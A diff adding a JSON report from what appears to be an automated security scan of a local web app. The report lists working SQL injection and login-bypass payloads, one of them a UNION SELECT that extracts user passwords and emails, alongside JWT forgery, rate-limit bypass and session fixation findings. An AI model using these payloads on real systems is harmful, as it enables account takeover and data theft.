@@ -1,0 +1,88 @@
+{
+  "timestamp": "2026-05-24T12:27:23.041450",
+  "target": "http://localhost:3000",
+  "duration": 38.19,
+  "findings": {
+    "critical": [
+      {
+        "type": "sql_injection",
+        "endpoint": "/rest/products/search",
+        "payload": "' UNION SELECT id,username,password,email,role,6,7,8 FROM Users--",
+        "data_exposed": [
+          "password",
+          "email",
+          "role",
+          "user"
+        ]
+      },
+      {
+        "type": "sql_injection",
+        "endpoint": "/rest/products/search",
+        "payload": "' OR 1=1 #",
+        "data_exposed": [
+          "token"
+        ]
+      },
+      {
+        "type": "auth_bypass",
+        "endpoint": "/rest/user/login",
+        "payload": "' OR 1=1--",
+        "data_exposed": [
+          "token",
+          "authentication"
+        ]
+      },
+      {
+        "type": "jwt_forgery",
+        "count": 1
+      }
+    ],
+    "high": [
+      {
+        "type": "sql_injection",
+        "endpoint": "/rest/products/search",
+        "payload": "') OR ('1'='1",
+        "data_exposed": [
+          "user"
+        ]
+      },
+      {
+        "type": "fuzzer_anomalies",
+        "critical": 8
+      },
+      {
+        "type": "rate_limit_bypass",
+        "detail": {
+          "attack_type": "rate_limit_bypass",
+          "endpoint": "/rest/products/search",
+          "total_requests": 50,
+          "successful": 50,
+          "rate_limited": 0,
+          "errors": 0,
+          "bypass_ratio": 100.0,
+          "vulnerable": true
+        }
+      }
+    ],
+    "medium": [
+      {
+        "type": "session_fixation",
+        "endpoint": "/rest/user/whoami"
+      }
+    ],
+    "low": []
+  },
+  "total": 8,
+  "token_captured": true,
+  "paths_leaked": 14,
+  "mission_log": [
+    "[12:26:48] [INFO] Profiled 12 endpoints",
+    "[12:26:50] [INFO] Exploits: 4 successful",
+    "[12:26:52] [INFO] Anomalies: 8",
+    "[12:26:58] [INFO] Fixation: 1 successful",
+    "[12:27:08] [INFO] Vulnerabilities: 1",
+    "[12:27:16] [INFO] Attempts: 52 | Success: 0",
+    "[12:27:22] [INFO] Gadget chains: 0 successful",
+    "[12:27:23] [INFO] Credentials extracted: 0"
+  ]
+}
